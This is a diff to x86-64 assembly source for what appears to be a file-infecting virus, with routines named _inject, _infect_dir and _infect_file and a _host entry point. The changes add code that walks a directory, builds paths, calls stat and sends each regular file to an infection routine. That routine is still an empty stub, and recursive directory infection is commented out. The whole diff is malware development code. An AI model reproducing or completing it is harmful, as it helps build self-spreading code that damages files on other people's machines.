@@ -25,9 +25,10 @@ _start:
 
 newline db `\n`, 0x0
 
-_print:; (string rdi) - use rcx, rdi, rsi, rdx, rax, rbx(temp)
+_print:; (string rdi) - use rdi, rsi, rdx, rax, rbx(temp)
 	push rdx
 	push rbx
+	push rsi
 
 	call _ft_strlen; ft_strlen(rdi)
 	push rdi; mov rsi, rdi
@@ -51,6 +52,7 @@ _print:; (string rdi) - use rcx, rdi, rsi, rdx, rax, rbx(temp)
 	push rbx
 	pop rdi
 
+	pop rsi
 	pop rbx
 	pop rdx
 ret
@@ -88,6 +90,8 @@ _inject:
 	jmp _host
 
 _infect_dir:; (string rdi)
+	push rcx
+
 	%ifdef DEBUG
 		call _print; _print(rdi)
 	%endif
@@ -129,6 +133,9 @@ _infect_dir:; (string rdi)
 		add rdi, rcx; r12 => linux_dir
 		; if not . .. +18
 		add rdi, 18; linux_dir->d_name
+		%ifdef DEBUG
+			call _print; _print(rdi)
+		%endif
 		
 		; ft_strcmp with '.' and '..' to not infect_dir with them
 		push rcx
@@ -152,9 +159,9 @@ _infect_dir:; (string rdi)
 				call _print; _print(rdi)
 			%endif
 
-		.concat_path:
-			sub rsp, 4096
+		; concat_path
 			push rbx
+			sub rsp, 4096
 
 			push rdi
 			pop rbx
@@ -169,14 +176,41 @@ _infect_dir:; (string rdi)
 			call _ft_strcpy
 			mov rdi, rsp
 
-			; check infect_dir or infect_file
-
 			%ifdef DEBUG
 				call _print; _print(rdi)
 			%endif
 
-			pop rbx
+		; check infect_dir or infect_file
+			sub rsp, 600
+
+			push 4
+			pop rax ; stat
+			mov rsi, rsp ; struct stat
+			syscall
+			cmp rax, 0x0
+			jne .free_buffers
+
+			mov eax, [rsi + 24]; statbuf.st_mode
+			and eax, 0o0170000
+;			cmp eax, 0o0040000
+;			je .infect_dir
+			cmp eax, 0o0100000
+			je .infect_file
+			add rsp, 600
+			jmp .free_buffers
+
+		.infect_dir:
+			call _infect_dir
+			add rsp, 600
+			jmp .free_buffers
+
+		.infect_file:
+			call _infect_file
+			add rsp, 600
+
+		.free_buffers:
 			add rsp, 4096
+			pop rbx
 
 		.next_dir:
 			pop rcx
@@ -201,6 +235,10 @@ _infect_dir:; (string rdi)
 		pop rsi
 		add rsp, 1024
 		pop r12
+		pop rcx
+ret
+
+_infect_file:
 ret
 
 _host:
